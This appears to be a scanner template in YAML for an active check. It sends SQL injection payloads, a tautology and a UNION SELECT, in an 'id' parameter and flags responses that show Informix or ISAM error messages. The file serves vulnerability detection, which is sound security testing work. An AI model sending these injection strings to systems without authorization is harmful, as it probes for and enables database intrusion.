id: sqli6-informix-06
name: 'SQLi informix probe in id'
severity: high
type: active
tags:
  - sqli
  - injection
  - informix
description: 'Triggers informix error via id'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      id:
        - '` OR `1`=`1'
        - ''' UNION SELECT NULL,NULL,NULL--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'Informix'
          - 'ISAM error'
